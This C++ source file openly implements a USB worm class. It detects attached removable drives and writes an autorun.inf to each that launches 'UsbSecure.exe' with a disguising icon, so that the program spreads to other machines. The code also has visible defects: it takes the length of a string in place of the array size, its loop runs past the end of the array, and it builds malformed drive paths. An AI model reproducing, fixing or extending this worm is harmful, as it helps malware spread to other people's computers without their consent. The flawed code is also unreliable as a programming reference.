#include <fstream>
#include <iostream>
#include <filesystem>

#include "worm.h"


using namespace std;
namespace fs = std::filesystem;


const string UsbDir[8] = { "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "D:\\", "R:\\", "V:\\" }; // Список возможных названий USB носителей


UsbWorm::UsbWorm(string name) // Constructor
 {
    autoRunStr = "[autorun]\nicon=iconca.ico \nopen=UsbSecure.exe ";

}


void UsbWorm::startPropagation() {
    usbPropagation();
    dirPropagation();
}


string* UsbWorm::checkUSB() // Method for search of connected USB devices
 {
    int count = 0;

    for ( int i = 0; i < UsbDir->length(); i++ ) {
        if (fs::is_directory(UsbDir[i])){
            count++;
        }
    }

    if ( count <= 0 ) {
        string* error = new string("noDevices");
        return error;
    }

    string* existDirs = new string[count];
    int dirIndex = 0;

    for ( int i = 0; i < UsbDir->length(); i++ ) {
        if (fs::is_directory(UsbDir[i])) {
            existDirs[dirIndex] = UsbDir[i];
            dirIndex++;
        }
    }

    return existDirs;
}


void UsbWorm::usbPropagation() // Method for USB propagation
 {
    if ( *checkUSB() == "noDevices" ) {
        cout << "No devices detected!" << endl;
        return;
    } 
    else {
        string* existDirs = checkUSB();
        for ( int i = 0; i <= existDirs->length(); i++ ) {
            ofstream file(existDirs[i] + ":\\autorun.inf");
            file << autoRunStr;
            file.close();
        }
    }
}
